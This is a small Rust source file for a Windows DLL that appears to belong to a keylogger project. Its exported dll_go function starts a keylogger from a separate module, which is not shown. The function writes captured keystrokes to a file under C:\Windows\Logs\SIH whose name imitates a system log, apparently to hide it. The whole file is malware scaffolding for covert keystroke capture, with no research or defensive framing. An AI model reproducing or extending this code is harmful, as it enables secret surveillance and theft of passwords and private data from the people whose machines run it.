mod os;

#[cfg(windows)]
use winapi::{shared::{minwindef::{BOOL, DWORD, HINSTANCE, LPVOID}}, um::{winuser}};

#[cfg(windows)]
#[no_mangle]
#[allow(non_snake_case, unused_variables)]
extern "system" fn DllMain(
    dll_module: HINSTANCE,
    call_reason: DWORD,
    reserved: LPVOID)
    -> BOOL {
    winapi::shared::minwindef::TRUE
}

#[no_mangle]
pub fn dll_go() -> (){
    // let _res = os::start_keylogger("C:\\Windows\\Logs\\SIH\\SIH.20240307.162282.822.1".to_owned(), 10);
    let _res = os::start_keylogger("C:\\Windows\\Logs\\SIH\\SIH.20240307.162282.822.1".to_owned(), 10);
    return ();
}